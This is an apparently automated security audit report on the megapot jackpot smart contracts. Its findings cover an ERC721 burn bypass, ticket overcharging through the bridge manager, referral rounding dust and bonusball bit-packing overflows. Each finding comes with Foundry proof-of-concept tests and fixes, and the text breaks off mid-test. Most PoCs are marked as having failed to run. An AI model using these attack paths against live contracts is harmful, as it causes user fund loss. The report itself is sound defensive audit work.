# 2025 11 megapot - Findings Report
## Commit hash: f0a7297d59c376e38b287b2c56740617dbbfbdc7

##Findings by Pattern


 **Derived From** : Only Jackpot can mint or burn tickets: msg.sender == address(jackpot)

[H-1]. Users/approved operators can bypass onlyJackpot via inherited ERC721 burn() and destroy tickets
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: RequiresRole



 **Derived From** : BridgeManager overcharges due to price desync with Jackpot’s per-drawing ticket price

[H-4]. JackpotBridgeManager.buyTickets overcharges when global ticketPrice > current drawing price, stranding excess USDC in BridgeManager
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : LibBit.popCount(tickets[id].packedTicket) == getExtendedTicketInfo(id).normals.length + 1

[M-5]. Bonusball bit can be dropped when (normalBallMax + bonusball) >= 256, causing unpack underflow and DoS in JackpotTicketNFT.getExtendedTicketInfo
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Upgrading payoutCalculator breaks historical payouts (no per-drawing snapshot)

[M-6]. Admin update to Jackpot.setPayoutCalculator invalidates historical tier payouts; past winners get 0 on claim
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: RequiresAdminRole



 **Derived From** : Per-drawing config not enforced: missing snapshot guard lets payouts use zeroed defaults

[M-7]. Missing snapshot guard in GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings lets mid-drawing calculator swap zero out all payouts
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: RequiresAdminRole



 **Derived From** : Emergency refunds use current referralFee instead of per-drawing fee, causing over/under-refunds

[M-8]. Retroactive fee use in Jackpot.emergencyRefundTickets misprices refunds and can overpay beyond ticket revenue
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Σ_i drawingTierInfo[_drawingId].premiumTierWeights[i] == PRECISE_UNIT

[M-12]. PayoutCalculator swap mid‑drawing skips snapshot; zeroed weights cause all winners to be paid 0 at settlement
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: RequiresAdminRole



 **Derived From** : pending[sequence].callback == msg.sender && pending[sequence].selector == _selector && keccak256(pending[sequence].context) == keccak256(_context) && pending[sequence].setRequests.length == _requests.length && for all i: pending[sequence].setRequests[i].minRange == _requests[i].minRange && pending[sequence].setRequests[i].maxRange == _requests[i].maxRange && pending[sequence].setRequests[i].samples == _requests[i].samples && pending[sequence].setRequests[i].withReplacement == _requests[i].withReplacement

[M-13]. Cross-provider sequence collision misroutes callbacks due to pending keyed only by sequence, leading to DoS/misbinding after provider rotation
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: RequiresAdminRole



 **Derived From** : (drawingState[prevDrawingId].lpEarnings - drawingUserWinnings) <= protocolFeeThreshold ? protocolFeeAmount == 0 : protocolFeeAmount == (drawingState[prevDrawingId].lpEarnings - drawingUserWinnings - protocolFeeThreshold) * protocolFee / PRECISE_UNIT

[M-15]. Cross‑drawing misattribution lets any winner spike lpEarnings right before settlement and overcharge protocol fee
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : drawingState[currentDrawingId].ballMax + drawingState[currentDrawingId].bonusballMax <= 255

[M-17]. Bonusball bit overflows uint256 packing (1 << (bonus+normalMax) == 0) causing claimWinnings DoS and misclassification
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 5
Privilege: RequiresAdminRole



 **Derived From** : Pending requests keyed only by sequence collide across providers, misrouting randomness/DoS

[M-18]. Provider-scoped sequence collision in ScaledEntropyProvider.entropyCallback misroutes randomness and causes UnknownSequence DoS after provider rotation
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: RequiresAdminRole



### Number of Findings
- C: 0
- H: 2
- M: 9
- L: 10
- I: 0

##Findings by Pattern


 **Derived From** : Only Jackpot can mint or burn tickets: msg.sender == address(jackpot)

## [H-1]. Users/approved operators can bypass onlyJackpot via inherited ERC721 burn() and destroy tickets

### Finding Severity Justification: Solady ERC721 exposes a public burn(uint256) that remains enabled in JackpotTicketNFT. This bypasses the intended onlyJackpot burn control, allowing any approved operator (or the owner) to irrevocably destroy a ticket. A malicious or compromised widely-approved operator (e.g., marketplace proxy) can burn a user’s winning ticket post-draw, permanently preventing claims and causing full loss of the user’s winnings. This is a direct asset loss with a realistic attack path, and the contract’s own presence of onlyJackpot(burnTicket) indicates the design intent to restrict burning.
## Derived From Pattern/Invariant
Only Jackpot can mint or burn tickets: msg.sender == address(jackpot)

## Exploit Type
AccessControl

## Location
JackpotTicketNFT.burn

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
JackpotTicketNFT intends to restrict burning to the Jackpot contract via burnTicket() guarded by onlyJackpot. However, it inherits Solady's ERC721 which exposes a public burn(uint256) function. JackpotTicketNFT does not override/disable this function, so any token owner or approved operator can call burn() directly and destroy a ticket without going through Jackpot. This bypasses the onlyJackpot permission and enables griefing: an approved operator (e.g., widely-approved marketplace proxy) can burn another user’s winning ticket, permanently preventing claims. Vulnerable snippet:

contract JackpotTicketNFT is ERC721 {
    ...
    function burnTicket(uint256 _ticketId) external onlyJackpot {
        _burn(_ticketId);
    }
    // Inherited public ERC721 burn(uint256) remains callable by owner/approved
}


## Impact
Approved operators or token owners can unilaterally burn tickets, causing permanent loss of claimability for winners and user DoS; undermines intended permission model that only Jackpot drives burns during claim/refund.

## Command to Run Test


## Proof of Concept
1) Jackpot mints a ticket to victim.
2) Victim (or their pre-approved operator) calls the inherited ERC721 burn(tokenId) directly.
3) The burn succeeds even though the caller is not the Jackpot contract, bypassing onlyJackpot.
4) Attempting to claim later reverts as the NFT no longer exists, locking the user's winnings.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";

interface ISoladyERC721Burn {
    function burn(uint256 tokenId) external payable;
}

contract BurnBypassTest is Test {
    JackpotTicketNFT nft;
    address jackpot = address(0xBEEF);
    address victim = address(0xA11CE);
    address attacker = address(0xBAD);

    function setUp() public {
        nft = new JackpotTicketNFT(IJackpot(jackpot));
        // Mint a ticket as if called by the Jackpot
        vm.prank(jackpot);
        nft.mintTicket(victim, 1, 1, 0, bytes32(0));
        assertEq(nft.balanceOf(victim), 1);
    }

    function test_BypassOnlyJackpotBurnViaInheritedERC721Burn() public {
        // Show that calling the guarded function reverts for non-jackpot
        vm.prank(attacker);
        vm.expectRevert(JackpotTicketNFT.UnauthorizedCaller.selector);
        nft.burnTicket(1);

        // Victim approves attacker as operator (common in practice for marketplaces)
        vm.prank(victim);
        nft.setApprovalForAll(attacker, true);

        // Attacker directly calls inherited ERC721 burn(), bypassing onlyJackpot
        vm.prank(attacker);
        ISoladyERC721Burn(address(nft)).burn(1);

        // Token burned; balance reduced
        assertEq(nft.balanceOf(victim), 0);
        // ownerOf should now revert (nonexistent token)
        vm.expectRevert();
        nft.ownerOf(1);
    }
}


## Suggested Mitigation
Explicitly override the inherited public burn function to enforce onlyJackpot or disable it entirely: e.g.,

function burn(uint256 tokenId) public payable override onlyJackpot { _burn(tokenId); }

or

function burn(uint256) public payable override { revert UnauthorizedCaller(); }

This ensures all burns are driven by Jackpot’s controlled flows (claim/refund) and prevents operators/owners from arbitrarily destroying tickets.





 **Derived From** : jackpot.currentDrawingId() > 0

## [L-2]. getLPValueBreakdown underflows on first round (currentDrawingId==0), causing universal view-function revert

### Finding Severity Justification: The issue is a view-only revert in getLPValueBreakdown when currentDrawingId == 0 due to using drawingAccumulator[currentDrawingId - 1]. It does not risk funds or state integrity and occurs only during the pre-launch bootstrap window before the first drawing is initialized. Impact is limited to UX/integrator inconvenience, and the function’s NatSpec explicitly assumes currentDrawingId > 0.
## Derived From Pattern/Invariant
jackpot.currentDrawingId() > 0

## Exploit Type
TimestampDependentLogic

## Location
JackpotLPManager.getLPValueBreakdown

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
JackpotLPManager.getLPValueBreakdown uses drawingAccumulator[currentDrawingId - 1] to price shares. When jackpot.currentDrawingId() == 0, the subtraction underflows (Solidity 0.8 checked arithmetic), reverting the call. This breaks all integrations (frontends, keepers, dashboards) that query portfolio valuation before the first drawing is initialized. Vulnerable snippet: activeDeposits: consolidatedShares * drawingAccumulator[currentDrawingId - 1] / PRECISE_UNIT and pendingWithdrawals: ... * drawingAccumulator[currentDrawingId - 1] / PRECISE_UNIT. No guard or fallback path exists when currentDrawingId == 0.

## Impact
Functional DoS for observers/integrators relying on this view; any call reverts system-wide until drawingId > 0, disrupting monitoring, off-chain automation, and UX at launch.

## Command to Run Test


## Proof of Concept
1) Deploy JackpotLPManager with a Jackpot stub returning currentDrawingId==0. 2) Any EOA calls getLPValueBreakdown(), which reverts due to currentDrawingId - 1 underflow. 3) After setting currentDrawingId=1 and initializing accumulator[0], the same call no longer reverts.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {stdError} from "forge-std/StdError.sol";
import {JackpotLPManager} from "contracts/JackpotLPManager.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";

contract DummyJackpot is IJackpot {
    uint256 public id;

    function setCurrentDrawingId(uint256 v) external { id = v; }

    function buyTickets(
        Ticket[] memory,
        address,
        address[] memory,
        uint256[] memory,
        bytes32
    ) external override returns (uint256[] memory ticketIds) {
        return new uint256[](0);
    }

    function claimWinnings(uint256[] memory) external override {}

    function ticketPrice() external view override returns (uint256) { return 0; }

    function currentDrawingId() external view override returns (uint256) { return id; }

    function getUnpackedTicket(uint256, uint256) external view override returns (uint8[] memory, uint8) {
        return (new uint8[](0), 0);
    }
}

contract GetLPValueBreakdown_FirstRound_Test is Test {
    JackpotLPManager manager;
    DummyJackpot jackpot;
    address user = address(0xA11CE);

    function setUp() public {
        jackpot = new DummyJackpot();
        manager = new JackpotLPManager(IJackpot(address(jackpot)));
    }

    function test_Reverts_When_CurrentDrawingId_Is_Zero() public {
        jackpot.setCurrentDrawingId(0);
        vm.expectRevert(stdError.arithmeticError);
        manager.getLPValueBreakdown(user);
    }

    function test_NoRevert_When_CurrentDrawingId_Is_One_And_Accumulator0_Initialized() public {
        jackpot.setCurrentDrawingId(1);
        vm.prank(address(jackpot));
        manager.initializeLP(); // sets drawingAccumulator[0] = 1e18

        JackpotLPManager.LPValueBreakdown memory br = manager.getLPValueBreakdown(user);
        assertEq(br.activeDeposits, 0);
        assertEq(br.pendingDeposits, 0);
        assertEq(br.pendingWithdrawals, 0);
        assertEq(br.claimableWithdrawals, 0);
    }
}


## Suggested Mitigation
Avoid underflow by using a safe previous index when currentDrawingId == 0, or short-circuit with a best-effort pre-initialization path. Example: in getLPValueBreakdown, compute uint256 cId = jackpot.currentDrawingId(); uint256 prev = (cId == 0) ? 0 : (cId - 1); then use prev for accumulator lookups. Optionally, if cId == 0, return LPValueBreakdown with activeDeposits and pendingWithdrawals valued at 0 (or PRECISE_UNIT if initializeLP already set) and pendingDeposits equal to lp.lastDeposit.amount when lp.lastDeposit.drawingId == 0. This preserves a non-reverting view before the first drawing while keeping estimates conservative.





 **Derived From** : Referral dust breaks conservation: deducted ≠ credited (accounting invariant)

## [L-3]. Referral rounding leaves unaccounted USDC: buyTickets/claimWinnings deduct full but only credit floored per‑referrer splits

### Finding Severity Justification: The behavior exists but only results in dust-level rounding remainder. Per purchase/claim, the unallocated remainder from per-referrer integer division is bounded by the number of referrers in micro‑USDC units and does not threaten solvency or create a realistic path to steal funds. The project’s docs explicitly accept conservative truncation and some unaccounted dust.
## Derived From Pattern/Invariant
Referral dust breaks conservation: deducted ≠ credited (accounting invariant)

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.buyTickets() / claimWinnings()

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In Jackpot.buyTickets and Jackpot.claimWinnings, the contract deducts the full referral amounts but credits referrers using per‑referrer integer division that floors, leaving a remainder unassigned. On purchases: referralFeeTotal = ticketsValue * referralFee / 1e18 is deducted from lpEarnings via currentDrawingState.lpEarnings += ticketsValue - referralFeeTotal, while each referrer gets referrerFee = referralFeeTotal * split[i] / 1e18. Due to flooring, Σ(referrerFee) ≤ referralFeeTotal and the delta is not returned to LP or referrers. On winnings: the user payout is reduced by referrerShare = winningAmount * referralWinShare / 1e18 and per‑referrer credits are referrerShare * split[i] / 1e18; Σ(credits) ≤ referrerShare and the delta is not returned to the user or LP. This violates accounting conservation (deducted ≠ credited + outstanding) and accumulates orphaned USDC in the contract over time.

Relevant code:
- buyTickets(): currentDrawingState.lpEarnings += ticketsValue - referralFeeTotal;
- _validateAndTrackReferrals(): referrerFee = referralFeeTotal * _referralSplit[i] / PRECISE_UNIT; referralFees[referrer] += referrerFee;
- claimWinnings(): totalClaimAmount += winningAmount - referrerShare;
- _payReferrersWinnings(): referrerFee = referrerShare * referralScheme.referralSplit[i] / PRECISE_UNIT; referralFees[referrer] += referrerFee;

## Impact
Conservation invariant breaks: contract USDC balance grows beyond tracked obligations. LP earnings are reduced by the full referral fee while referrers receive only the floored sum, and winners lose the full referrerShare while referrers receive only the floored sum; the remainders become stuck, skewing protocol fee calculations and LP accounting over time.

## Command to Run Test


## Proof of Concept
1) Set referralFee so referralFeeTotal equals 1 micro‑USDC per 1 USDC of ticketsValue. Use two referrers with 50/50 split.
2) Call _validateAndTrackReferrals with ticketsValue = 1_000_000 (1 USDC). referralFeeTotal = 1, but each referrer gets floor(1*0.5) = 0. Σ(credited)=0 < referralFeeTotal=1 → 1 micro‑USDC orphaned while lpEarnings was reduced by 1.
3) Create referral scheme from step (2), then call _payReferrersWinnings with winningAmount=1 (micro‑USDC) and referralWinShare=100%. referrerShare=1, but each referrer gets 0 again. The winner is charged 1, but referrers receive 0; the 1 micro‑USDC remainder is orphaned.
4) Repeating with many purchases/claims accumulates unaccounted USDC in the contract, breaking the conservation invariant (deducted ≠ credited).

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import {Jackpot} from "../contracts/Jackpot.sol";

contract JackpotHarness is Jackpot {
    constructor() Jackpot(
        1 days,
        35,
        1,
        1e16,      // lpEdgeTarget
        0,         // reserveRatio
        1e17,      // referralFee (will override in test)
        2e17,      // referralWinShare
        0,         // protocolFee
        0,         // protocolFeeThreshold
        1_000_000, // ticketPrice = 1 USDC
        10,        // maxReferrers
        200000     // entropyBaseGasLimit
    ) {}
    function exposed_validateAndTrackReferrals(address[] memory refs, uint256[] memory split, uint256 value)
        external
        returns (uint256, bytes32)
    { return _validateAndTrackReferrals(refs, split, value); }
    function exposed_payReferrersWinnings(bytes32 schemeId, uint256 winAmt, uint256 winShare)
        external
        returns (uint256)
    { return _payReferrersWinnings(schemeId, winAmt, winShare); }
}

contract ReferralDustTest is Test {
    JackpotHarness jack;
    address r1 = address(0x1);
    address r2 = address(0x2);

    function setUp() public {
        jack = new JackpotHarness();
    }

    function test_referral_dust_in_purchase_and_winnings() public {
        // Make referralFee so 1 USDC ticketsValue => referralFeeTotal = 1 micro-USDC
        vm.prank(jack.owner());
        jack.setReferralFee(1e12); // 1e12 / 1e18 = 1e-6

        address[] memory refs = new address[](2);
        refs[0] = r1; refs[1] = r2;
        uint256[] memory split = new uint256[](2);
        split[0] = 5e17; split[1] = 5e17; // 50/50

        (uint256 referralFeeTotal, bytes32 schemeId) = jack.exposed_validateAndTrackReferrals(refs, split, 1_000_000);
        assertEq(referralFeeTotal, 1); // deducted from lpEarnings path in buyTickets
        // Each referrer gets floor(1 * 0.5) = 0
        uint256 creditedPurchase = jack.referralFees(r1) + jack.referralFees(r2);
        assertEq(creditedPurchase, 0);
        assertGt(referralFeeTotal, creditedPurchase); // orphaned remainder

        // Now winnings: 1 micro-USDC referrerShare at 100% split -> both floored to 0
        uint256 refShare = jack.exposed_payReferrersWinnings(schemeId, 1, 1e18);
        assertEq(refShare, 1); // user charged full share
        uint256 creditedWinnings = jack.referralFees(r1) + jack.referralFees(r2);
        assertEq(creditedWinnings, 0); // nothing actually credited due to flooring
    }
}

## Suggested Mitigation
Make deducted == credited by allocating the remainder deterministically. For purchases: accumulate per-referrer credits in the loop, and for the last referrer set payout = referralFeeTotal − sumCredited so Σ == referralFeeTotal; or credit the remainder back into lpEarnings. For winnings: similarly, pay the last referrer payout = referrerShare − sumCredited; when no scheme, keep current behavior (credit entire referrerShare to LP). This ensures conservation and avoids orphaned USDC.





 **Derived From** : BridgeManager overcharges due to price desync with Jackpot’s per-drawing ticket price

## [H-4]. JackpotBridgeManager.buyTickets overcharges when global ticketPrice > current drawing price, stranding excess USDC in BridgeManager

### Finding Severity Justification: BridgeManager charges users using the global next-drawing ticketPrice while Jackpot charges the frozen per-drawing price. When governance legitimately updates ticketPrice mid-drawing (per design), cross-chain buyers are overcharged and the excess USDC remains stuck in JackpotBridgeManager with no refund path. This is a direct, permanent loss of user funds (real amounts), meeting Code4rena’s High severity criteria.
## Derived From Pattern/Invariant
BridgeManager overcharges due to price desync with Jackpot’s per-drawing ticket price

## Exploit Type
AccountingInvariantViolation

## Location
JackpotBridgeManager.buyTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
JackpotBridgeManager.buyTickets computes ticketCost using jackpot.ticketPrice() (a global value intended for the next drawing), then pulls that amount from the buyer and approves the Jackpot. However, Jackpot.buyTickets actually charges numTickets * drawingState[currentDrawingId].ticketPrice (the frozen per‑drawing price). If governance updates the global ticketPrice mid‑drawing to a higher value (for the next drawing), buyTickets in the BridgeManager will overcollect USDC. Jackpot will only pull the lower, per‑drawing amount, leaving the difference stuck in the BridgeManager with no recovery path for the buyer. Vulnerable snippet in JackpotBridgeManager.buyTickets:
  - uint256 ticketPrice = jackpot.ticketPrice();
  - uint256 ticketCost = ticketPrice * _tickets.length;
  - usdc.safeTransferFrom(msg.sender, address(this), ticketCost);
  - usdc.approve(address(jackpot), ticketCost);
  - jackpot.buyTickets(...);
And in Jackpot.buyTickets:
  - uint256 ticketsValue = numTicketsBought * currentDrawingState.ticketPrice;
  - usdc.safeTransferFrom(msg.sender, address(this), ticketsValue);
This desync creates an AccountingInvariantViolation where user pays more than the protocol actually consumes, and the excess accumulates in BridgeManager.

## Impact
Users are directly overcharged; the excess USDC remains stranded in the BridgeManager. Repeated purchases during the desync window can accumulate significant stuck funds.

## Command to Run Test


## Proof of Concept
Scenario: current drawing per‑drawing ticket price is 1 USDC, while governance sets the global jackpot.ticketPrice to 2 USDC for the next round (allowed mid‑drawing). A cross-chain buyer purchases 10 tickets via the BridgeManager. The BridgeManager charges 20 USDC from the user and approves 20 USDC, but Jackpot pulls only 10 USDC (10 * current drawing price). The remaining 10 USDC stays in the BridgeManager, with no refund path. Repeating this inflates stranded funds.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {JackpotBridgeManager} from "contracts/JackpotBridgeManager.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IJackpotTicketNFT} from "contracts/interfaces/IJackpotTicketNFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("USDC", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockJackpot is IJackpot {
    IERC20 public usdc;
    uint256 public override ticketPrice; // global (next-drawing) price
    uint256 public currentPrice;         // per-drawing frozen price
    uint256 public override currentDrawingId;

    constructor(IERC20 _usdc, uint256 _currentDrawingId) {
        usdc = _usdc;
        currentDrawingId = _currentDrawingId;
    }

    function setGlobalTicketPrice(uint256 p) external { ticketPrice = p; }
    function setCurrentDrawingPrice(uint256 p) external { currentPrice = p; }
    function setCurrentDrawingId(uint256 id) external { currentDrawingId = id; }

    function buyTickets(
        Ticket[] memory _tickets,
        address /*_recipient*/,
        address[] memory /*_referrers*/,
        uint256[] memory /*_referralSplitBps*/,
        bytes32 /*_source*/
    ) external override returns (uint256[] memory ticketIds) {
        uint256 num = _tickets.length;
        uint256 ticketsValue = num * currentPrice;
        require(usdc.transferFrom(msg.sender, address(this), ticketsValue), "pull failed");
        ticketIds = new uint256[](num);
        for (uint256 i = 0; i < num; i++) { ticketIds[i] = i + 1; }
    }

    function claimWinnings(uint256[] memory /*_userTicketIds*/) external override {}

    function getUnpackedTicket(uint256, uint256) external pure override returns (uint8[] memory, uint8) {
        uint8[] memory normals = new uint8[](5);
        return (normals, 1);
    }
}

contract BridgeManagerPriceDesyncTest is Test {
    MockUSDC usdc;
    MockJackpot jackpot;
    JackpotBridgeManager bridge;
    address user = address(0xBEEF);

    function setUp() public {
        usdc = new MockUSDC();
        jackpot = new MockJackpot(IERC20(address(usdc)), 1);
        // Global price (next drawing): 2 USDC; Current drawing price: 1 USDC
        jackpot.setGlobalTicketPrice(2_000_000);   // 2 USDC with 6 decimals
        jackpot.setCurrentDrawingPrice(1_000_000); // 1 USDC with 6 decimals

        bridge = new JackpotBridgeManager(
            IJackpot(address(jackpot)),
            IJackpotTicketNFT(address(0)),
            IERC20(address(usdc)),
            "BridgeMgr",
            "1"
        );

        usdc.mint(user, 100_000_000); // 100 USDC
        vm.startPrank(user);
        usdc.approve(address(bridge), type(uint256).max);
        vm.stopPrank();
    }

    function testOverchargeAndStrandedFunds() public {
        // Prepare 10 tickets
        IJackpot.Ticket[] memory tickets = new IJackpot.Ticket[](10);
        for (uint256 i = 0; i < tickets.length; i++) {
            tickets[i].normals = new uint8[](5);
            tickets[i].normals[0] = 1;
            tickets[i].normals[1] = 2;
            tickets[i].normals[2] = 3;
            tickets[i].normals[3] = 4;
            tickets[i].normals[4] = 5;
            tickets[i].bonusball = 1;
        }

        uint256 userBefore = usdc.balanceOf(user);
        uint256 bridgeBefore = usdc.balanceOf(address(bridge));
        uint256 jackpotBefore = usdc.balanceOf(address(jackpot));

        vm.prank(user);
        bridge.buyTickets(tickets, user, new address[](0), new uint256[](0), bytes32(0));

        // BridgeManager charged 10 * 2 USDC = 20 USDC from user
        // Jackpot pulled only 10 * 1 USDC = 10 USDC; leftover 10 USDC remains in BridgeManager
        uint256 userAfter = usdc.balanceOf(user);
        uint256 bridgeAfter = usdc.balanceOf(address(bridge));
        uint256 jackpotAfter = usdc.balanceOf(address(jackpot));

        assertEq(userBefore - userAfter, 20_000_000, "user should pay 20 USDC");
        assertEq(jackpotAfter - jackpotBefore, 10_000_000, "jackpot should receive 10 USDC");
        assertEq(bridgeAfter - bridgeBefore, 10_000_000, "excess 10 USDC stranded in BridgeManager");
        assertGt(bridgeAfter, 0, "stranded funds present");
    }
}


## Suggested Mitigation
Make the BridgeManager charge exactly the active drawing’s ticket price and/or refund any excess: (A) Add a view in Jackpot that returns the current drawing’s ticket price (e.g., function currentTicketPrice() returns drawingState[currentDrawingId].ticketPrice) and expose it on IJackpot. Then in JackpotBridgeManager.buyTickets, compute ticketCost = jackpot.currentTicketPrice() * _tickets.length. This guarantees parity with Jackpot.buyTickets. (B) Additionally (or if interface changes are not possible immediately), harden BridgeManager to refund over-collection: record pre = usdc.balanceOf(address(this)); pull user funds using a conservative upper bound (e.g., global ticketPrice * n), call jackpot.buyTickets, then compute leftover = usdc.balanceOf(address(this)) - pre and transfer leftover back to msg.sender. This ensures users are never overcharged even if governance updates ticketPrice mid-drawing. Prefer (A) as the primary fix to avoid under-collection reverts when global price is lower than the per-drawing price; keep (B) as a safety net.





 **Derived From** : LibBit.popCount(tickets[id].packedTicket) == getExtendedTicketInfo(id).normals.length + 1

## [M-5]. Bonusball bit can be dropped when (normalBallMax + bonusball) >= 256, causing unpack underflow and DoS in JackpotTicketNFT.getExtendedTicketInfo

### Finding Severity Justification: A missing boundary check allows packing the bonusball bit beyond the 256-bit word when normalBallMax + bonusball >= 256. This leads to dropped bonusball bits and downstream underflows in unpackTicket, DoSing views (getExtendedTicketInfo/getUnpackedTicket). More critically, it also corrupts tier computation in _calculateTicketTierId: the bonusball is always seen as matched (both shift results are 0), and when 0 normal matches occur the subtraction underflows, reverting claimWinnings for those tickets. While funds are not directly drained, users can be prevented from claiming or receive incorrect tiers. Triggering requires governance to set parameters that violate the intended invariant (bonusballMax ≤ 255 − normalBallMax), so impact is high but likelihood relies on admin configuration; per C4 rules this makes it Medium.
## Derived From Pattern/Invariant
LibBit.popCount(tickets[id].packedTicket) == getExtendedTicketInfo(id).normals.length + 1

## Exploit Type
IntegerMath

## Location
JackpotTicketNFT.getExtendedTicketInfo

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The packed ticket uses a bit at position (normalBallMax + bonusball) to encode the bonusball: TicketComboTracker.insert sets it with `set |= 1 << (_bonusball + _tracker.normalMax);`. There is no enforcement that this position is <= 255. When `_bonusball + _tracker.normalMax >= 256`, the EVM shift left returns 0, so the bonusball bit is omitted. This violates the arithmetic invariant that the packed vector contains exactly 5 normals + 1 bonus bit. Later, `TicketComboTracker.unpackTicket` computes `bonusball = uint8(LibBit.fls(_packedTicket) - _normalMax);`. If the highest set bit is ≤ normalMax (because the bonus bit was dropped) this subtraction underflows in Solidity 0.8 and reverts. As a result, `Jackpot.getUnpackedTicket()` and `JackpotTicketNFT.getExtendedTicketInfo()` revert for affected tickets, DoSing reads for users and integrators. Vulnerable snippets:

- TicketComboTracker.insert:
`ticketNumbers = set |= 1 << (_bonusball + _tracker.normalMax);`

- TicketComboTracker.unpackTicket:
`bonusball = uint8(LibBit.fls(_packedTicket) - _normalMax);`

- Jackpot.getUnpackedTicket forwards to `unpackTicket(_packedTicket, drawingState[_drawingId].ballMax)` and JackpotTicketNFT.getExtendedTicketInfo calls that, so the revert bubbles into NFT views.

## Impact
If governance configures parameters such that normalBallMax + bonusballMax > 255, the bonusball bit is packed beyond the 256-bit word and is dropped (1 << (normalMax + bonus) == 0). Consequences:
- View-path DoS: Ticket decoding via TicketComboTracker.unpackTicket reverts because the function allocates normals array as popCount(packed) - 1; when the bonus bit is missing, popCount equals 5 and the function tries to write 5 normals into a 4-length array, reverting. This breaks Jackpot.getUnpackedTicket and JackpotTicketNFT.getExtendedTicketInfo, impacting UIs and indexers.
- Tier calculation corruption: When both ticket and winning bonus bits are dropped (i.e., winningBonusball >= 256 - normalBallMax), ticketBonusball == winningBonusball == 0 makes bonusballMatch == 1. For tickets with 0 normal matches, _calculateTicketTierId computes 2 * (0 - 1) + 1 and underflows, reverting. This can DoS getTicketTierIds and will revert claimWinnings if a user includes any such losing ticket in the batch. While funds aren’t directly drained, reads are broken and some claims can be blocked or require special handling. Likelihood depends on admin configuration; severity is medium.

## Command to Run Test


## Proof of Concept
Scenario demonstrating two distinct failure modes when the bonus bit is dropped:
1) Decode DoS via unpackTicket:
- Configure a drawing where normalBallMax = 254 and bonusballMax >= 2.
- A user buys a ticket with bonusball = 2.
- Ticket packing sets the bonus bit with 1 << (254 + 2) = 1 << 256 = 0, so the packed ticket only contains the 5 normal bits.
- TicketComboTracker.unpackTicket computes ballCount = popCount(packed) = 5, allocates normals = new uint8[](4), then writes 5 normals into a 4-length array, reverting. Jackpot.getUnpackedTicket and JackpotTicketNFT.getExtendedTicketInfo both bubble this revert.

2) Tier underflow in _calculateTicketTierId when both bonus bits drop:
- With the same configuration, if the winning bonusball also satisfies (normalBallMax + winningBonusball) >= 256, the winning ticket’s bonus bit is also dropped.
- In _calculateTicketTierId: ticketBonusball == 0 and winningBonusball == 0, so bonusballMatch == 1. For a ticket with 0 normal matches against the winning normals, matches == 0. The expression 2 * (matches - bonusballMatch) + bonusballMatch evaluates 2 * (0 - 1) + 1 and underflows, reverting. This breaks getTicketTierIds and any claimWinnings batch that includes such a losing ticket.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {LibBit} from "solady/src/utils/LibBit.sol";
import {TicketComboTracker} from "contracts/lib/TicketComboTracker.sol";

contract TicketHarness {
    function unpack(uint256 packed, uint8 nm) external pure returns (uint8[] memory normals, uint8 bonus) {
        return TicketComboTracker.unpackTicket(packed, nm);
    }
}

contract TierHarness {
    // Mirrors Jackpot._calculateTicketTierId for testing the underflow scenario.
    function calcTier(uint256 ticket, uint256 winning, uint8 normalMax) external pure returns (uint256) {
        uint256 matches = LibBit.popCount(ticket & winning);
        uint256 ticketBonusball = ticket >> (normalMax + 1);
        uint256 winningBonusball = winning >> (normalMax + 1);
        uint256 bonusballMatch = (ticketBonusball == winningBonusball) ? 1 : 0;
        // Underflow when matches == 0 and bonusballMatch == 1
        return 2 * (matches - bonusballMatch) + bonusballMatch;
    }
}

contract BonusballShiftEdgeTests is Test {
    TicketHarness unpackHarness;
    TierHarness tierHarness;

    function setUp() public {
        unpackHarness = new TicketHarness();
        tierHarness = new TierHarness();
    }

    function test_BonusballBitDropped_ShiftGE256_RevertsUnpack() public {
        uint8 normalMax = 254; // High ballMax
        // craft normals: {1,2,3,4,5}
        uint256 packed = 0;
        for (uint8 i = 1; i <= 5; ++i) {
